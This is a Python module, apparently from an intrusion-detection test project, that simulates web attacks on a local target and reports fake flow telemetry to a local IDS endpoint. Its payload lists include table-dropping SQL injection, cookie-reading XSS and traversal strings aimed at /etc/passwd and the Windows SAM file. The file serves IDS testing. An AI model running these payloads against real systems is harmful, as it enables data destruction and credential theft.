"""
For educational use against your own local test environment only.
Web Attack simulation: sends SQL injection, XSS, and directory traversal payloads.
"""
import time
import random
import threading
import json
import urllib.request
import requests as req
from attacks.attack_base import BaseAttack

# Common web attack payloads for simulation
_SQL_INJECTION_PAYLOADS = [
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "1' AND '1'='1",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables--",
    "' OR ''='",
]

_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('XSS')>",
]

_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]


# Inheritance
class WebAttack(BaseAttack):
    """Simulates web application attacks: SQL injection, XSS, path traversal."""

    def __init__(self, target: str = "127.0.0.1", port: int = 5000, duration: int = 10) -> None:
        """Initialise web attack simulator."""
        super().__init__(target=target, port=port, duration=duration)

    def _report_telemetry(self, attack_subtype: str) -> None:
        """Send flow telemetry to IDS backend with web attack patterns."""
        def _post():
            try:
                # Web attacks: moderate packets, targeting port 5000/80/443, varying packet sizes
                payload = json.dumps({
                    "dst_port": self.port,
                    "src_ip": "127.0.0.1",
                    "src_port": random.randint(40000, 65000),
                    "fwd_pkts": random.randint(3, 15),
                    "bwd_pkts": random.randint(1, 5),
                    "syn": 1,
                    "ack": 1,
                    "pkt_len": random.randint(200, 1500),  # Larger payloads typical of web attacks
                    "duration_us": random.uniform(5000, 50000),
                    "attack_type": "WebAttack",
                }).encode("utf-8")
                r = urllib.request.Request(
                    "http://127.0.0.1:8000/live/ingest",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                )
                urllib.request.urlopen(r, timeout=0.5)
            except Exception:
                pass
        threading.Thread(target=_post, daemon=True).start()

    # Polymorphism
    def run(self) -> None:
        """Execute SQL injection, XSS, and path traversal attempts."""
        base_url = f"http://{self.target}:{self.port}"
        print(f"[WebAttack] Starting web attack simulation on {base_url}")
        start = time.time()
        deadline = start + self.duration
        attempt = 0

        attack_types = [
            ("SQLi", self._sqli_attempt),
            ("XSS", self._xss_attempt),
            ("Traversal", self._traversal_attempt),
        ]

        while time.time() < deadline:
            for subtype, attack_fn in attack_types:
                if time.time() >= deadline:
                    break
                attempt += 1
                try:
                    result = attack_fn(base_url)
                    self._report_telemetry(subtype)
                    print(f"  [{attempt:3d}] {subtype}: {result}")
                except Exception as exc:
                    print(f"  [{attempt:3d}] {subtype} ERROR: {exc}")
                time.sleep(0.15)

        print(f"\n[WebAttack] Attack finished after {self.duration}s. {attempt} attempts made.")

    def _sqli_attempt(self, base_url: str) -> str:
        """Send SQL injection payload."""
        payload = random.choice(_SQL_INJECTION_PAYLOADS)
        try:
            r = req.get(f"{base_url}/api/items", params={"id": payload}, timeout=3)
            return f"SQLi payload='{payload[:30]}' -> HTTP {r.status_code}"
        except Exception as exc:
            return f"SQLi ERROR: {exc}"

    def _xss_attempt(self, base_url: str) -> str:
        """Send XSS payload."""
        payload = random.choice(_XSS_PAYLOADS)
        try:
            r = req.get(f"{base_url}/", params={"q": payload}, timeout=3)
            return f"XSS payload='{payload[:30]}' -> HTTP {r.status_code}"
        except Exception as exc:
            return f"XSS ERROR: {exc}"

    def _traversal_attempt(self, base_url: str) -> str:
        """Send path traversal payload."""
        payload = random.choice(_TRAVERSAL_PAYLOADS)
        try:
            r = req.get(f"{base_url}/{payload}", timeout=3)
            return f"Traversal='{payload[:30]}' -> HTTP {r.status_code}"
        except Exception as exc:
            return f"Traversal ERROR: {exc}"
